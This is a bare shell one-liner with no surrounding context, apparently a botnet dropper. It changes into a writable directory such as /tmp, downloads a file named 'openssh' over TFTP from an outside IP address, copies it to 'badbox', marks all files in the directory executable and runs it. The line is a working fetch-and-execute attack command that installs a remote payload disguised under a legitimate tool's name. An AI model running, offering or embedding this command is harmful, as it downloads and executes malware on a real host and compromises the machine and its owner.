cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 88.99.62.36;cat openssh >badbox;chmod +x *;./badbox
